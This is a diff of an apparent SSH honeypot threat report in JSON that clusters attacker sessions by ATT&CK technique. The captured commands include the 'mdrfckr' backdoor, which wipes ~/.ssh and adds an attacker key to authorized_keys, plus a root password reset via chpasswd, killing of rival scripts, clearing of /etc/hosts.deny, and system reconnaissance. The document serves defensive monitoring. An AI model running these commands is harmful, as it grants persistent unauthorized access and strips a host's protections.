@@ -1,22 +1,27 @@
 {
-  "generated_at": "2026-04-29T03:31:12.050241+00:00",
-  "total_sessions_with_commands": 12,
-  "total_clusters": 4,
+  "generated_at": "2026-04-29T06:26:53.584259+00:00",
+  "total_sessions_with_commands": 2,
+  "total_clusters": 2,
   "campaign_clusters": 1,
   "singleton_clusters": 2,
   "highest_severity": "HIGH",
   "active_campaigns": [
     {
-      "cluster_id": "CLU-003",
+      "cluster_id": "CLU-001",
       "name": "mdrfckr SSH Key Injection",
       "severity": "HIGH",
-      "session_count": 8,
-      "unique_ip_count": 2,
+      "session_count": 1,
+      "unique_ip_count": 1,
       "ttps": [
         "T1021.004",
         "T1078",
+        "T1083",
+        "T1082",
+        "T1592",
         "T1070",
         "T1140",
+        "T1547",
+        "T1489",
         "T1105"
       ]
     }
@@ -24,79 +29,6 @@
   "clusters": [
     {
       "cluster_id": "CLU-001",
-      "is_campaign": false,
-      "campaign_name": null,
-      "campaign_severity": null,
-      "campaign_description": null,
-      "matched_campaigns": [],
-      "session_count": 1,
-      "unique_ips": [
-        "187.120.189.6"
-      ],
-      "unique_ip_count": 1,
-      "sequence_hash": "1fb64ad0e7e4f5a4",
-      "ttps": [
-        {
-          "id": "T1083",
-          "name": "File & Directory Discovery"
-        }
-      ],
-      "representative_commands": [
-        "?",
-        "ls",
-        "cd ~",
-        "> a6s87d6as8zdgtdyas.ini",
-        "ls",
-        "exit"
-      ],
-      "members": [
-        {
-          "session_id": "IR-3f1992b60e9d",
-          "src_ip": "187.120.189.6",
-          "country": "",
-          "isp": "",
-          "command_count": 6,
-          "timestamp": "2026-04-29T01:16:48.041490Z"
-        }
-      ]
-    },
-    {
-      "cluster_id": "CLU-002",
-      "is_campaign": false,
-      "campaign_name": null,
-      "campaign_severity": null,
-      "campaign_description": null,
-      "matched_campaigns": [],
-      "session_count": 1,
-      "unique_ips": [
-        "187.120.189.6"
-      ],
-      "unique_ip_count": 1,
-      "sequence_hash": "21e277d451203fee",
-      "ttps": [
-        {
-          "id": "T1083",
-          "name": "File & Directory Discovery"
-        }
-      ],
-      "representative_commands": [
-        "?",
-        "cd ~",
-        "ls"
-      ],
-      "members": [
-        {
-          "session_id": "IR-bbcdf422afff",
-          "src_ip": "187.120.189.6",
-          "country": "",
-          "isp": "",
-          "command_count": 3,
-          "timestamp": "2026-04-29T01:17:22.363426Z"
-        }
-      ]
-    },
-    {
-      "cluster_id": "CLU-003",
       "is_campaign": true,
       "campaign_name": "mdrfckr SSH Key Injection",
       "campaign_severity": "HIGH",
@@ -115,13 +47,12 @@
           "pattern_total": 3
         }
       ],
-      "session_count": 8,
+      "session_count": 1,
       "unique_ips": [
-        "177.17.92.158",
-        "163.7.6.74"
+        "124.236.76.72"
       ],
-      "unique_ip_count": 2,
-      "sequence_hash": "98af0db988d5971c",
+      "unique_ip_count": 1,
+      "sequence_hash": "82ff9647466220da",
       "ttps": [
         {
           "id": "T1021.004",
@@ -130,108 +61,6 @@
         {
           "id": "T1078",
           "name": "Valid Accounts"
-        },
-        {
-          "id": "T1070",
-          "name": "Indicator Removal"
-        },
-        {
-          "id": "T1140",
-          "name": "Deobfuscate/Decode Files"
-        },
-        {
-          "id": "T1105",
-          "name": "T1105"
-        }
-      ],
-      "representative_commands": [
-        "cd ~; chattr -ia .ssh; lockr -ia .ssh",
-        "cd ~ && rm -rf .ssh && mkdir .ssh && echo \"ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr\">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~"
-      ],
-      "members": [
-        {
-          "session_id": "IR-e7b5f7883faa",
-          "src_ip": "163.7.6.74",
-          "country": "",
-          "isp": "",
-          "command_count": 2,
-          "timestamp": "2026-04-29T00:08:12.405638Z"
-        },
-        {
-          "session_id": "IR-16e24d6298f5",
-          "src_ip": "163.7.6.74",
-          "country": "",
-          "isp": "",
-          "command_count": 2,
-          "timestamp": "2026-04-29T00:09:15.947621Z"
-        },
-        {
-          "session_id": "IR-249dfa2d9277",
-          "src_ip": "177.17.92.158",
-          "country": "",
-          "isp": "",
-          "command_count": 2,
-          "timestamp": "2026-04-29T02:20:37.180377Z"
-        },
-        {
-          "session_id": "IR-16b11e7c3d8e",
-          "src_ip": "177.17.92.158",
-          "country": "",
-          "isp": "",
-          "command_count": 2,
-          "timestamp": "2026-04-29T02:24:28.398926Z"
-        },
-        {
-          "session_id": "IR-baa012b3d45a",
-          "src_ip": "177.17.92.158",
-          "country": "",
-          "isp": "",
-          "command_count": 2,
-          "timestamp": "2026-04-29T02:28:11.474176Z"
-        },
-        {
-          "session_id": "IR-a6eee8afeea8",
-          "src_ip": "177.17.92.158",
-          "country": "",
-          "isp": "",
-          "command_count": 2,
-          "timestamp": "2026-04-29T02:35:22.417059Z"
-        },
-        {
-          "session_id": "IR-eb7588de4e9c",
-          "src_ip": "177.17.92.158",
-          "country": "",
-          "isp": "",
-          "command_count": 2,
-          "timestamp": "2026-04-29T02:38:43.737353Z"
-        },
-        {
-          "session_id": "IR-890187918f26",
-          "src_ip": "177.17.92.158",
-          "country": "",
-          "isp": "",
-          "command_count": 2,
-          "timestamp": "2026-04-29T02:45:51.954131Z"
-        }
-      ]
-    },
-    {
-      "cluster_id": "CLU-004",
-      "is_campaign": false,
-      "campaign_name": null,
-      "campaign_severity": null,
-      "campaign_description": null,
-      "matched_campaigns": [],
-      "session_count": 2,
-      "unique_ips": [
-        "31.56.209.39"
-      ],
-      "unique_ip_count": 1,
-      "sequence_hash": "5769bf594afef6e5",
-      "ttps": [
-        {
-          "id": "T1105",
-          "name": "Ingress Tool Transfer"
         },
         {
           "id": "T1083",
@@ -244,28 +73,81 @@
         {
           "id": "T1592",
           "name": "Gather Victim Host Info"
+        },
+        {
+          "id": "T1070",
+          "name": "Indicator Removal"
+        },
+        {
+          "id": "T1140",
+          "name": "Deobfuscate/Decode Files"
+        },
+        {
+          "id": "T1547",
+          "name": "Boot/Logon Autostart"
+        },
+        {
+          "id": "T1489",
+          "name": "Service Stop"
+        },
+        {
+          "id": "T1105",
+          "name": "T1105"
         }
       ],
       "representative_commands": [
-        "echo \"cat /proc/1/mounts && ls /proc/1/; curl2; ps aux; ps\" | sh",
-        "cat /proc/1/mounts && ls /proc/1/; curl2; ps aux; ps"
+        "cd ~; chattr -ia .ssh; lockr -ia .ssh",
+        "cd ~ && rm -rf .ssh && mkdir .ssh && echo \"ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr\">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~",
+        "cat /proc/cpuinfo | grep name | wc -l",
+        "echo \"root:dSiq1yMtTkhg\"|chpasswd|bash",
+        "rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;",
+        "cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'",
+        "free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'",
+        "ls -lh $(which ls)",
+        "which ls",
+        "crontab -l"
       ],
       "members": [
         {
-          "session_id": "IR-ad40dedc2c36",
-          "src_ip": "31.56.209.39",
+          "session_id": "IR-4c5496baf95d",
+          "src_ip": "124.236.76.72",
           "country": "",
           "isp": "",
-          "command_count": 2,
-          "timestamp": "2026-04-29T00:17:50.486934Z"
-        },
+          "command_count": 19,
+          "timestamp": "2026-04-29T04:44:07.239542Z"
+        }
+      ]
+    },
+    {
+      "cluster_id": "CLU-002",
+      "is_campaign": false,
+      "campaign_name": null,
+      "campaign_severity": null,
+      "campaign_description": null,
+      "matched_campaigns": [],
+      "session_count": 1,
+      "unique_ips": [
+        "180.100.214.90"
+      ],
+      "unique_ip_count": 1,
+      "sequence_hash": "6fa4c8ac58e7a1d9",
+      "ttps": [
         {
-          "session_id": "IR-0fd16d6b0c52",
-          "src_ip": "31.56.209.39",
+          "id": "T1082",
+          "name": "System Information Discovery"
+        }
+      ],
+      "representative_commands": [
+        "uname -s -m"
+      ],
+      "members": [
+        {
+          "session_id": "IR-040f57beb5a4",
+          "src_ip": "180.100.214.90",
           "country": "",
           "isp": "",
-          "command_count": 2,
-          "timestamp": "2026-04-29T00:17:51.382126Z"
+          "command_count": 1,
+          "timestamp": "2026-04-29T03:55:47.485054Z"
         }
       ]
     }
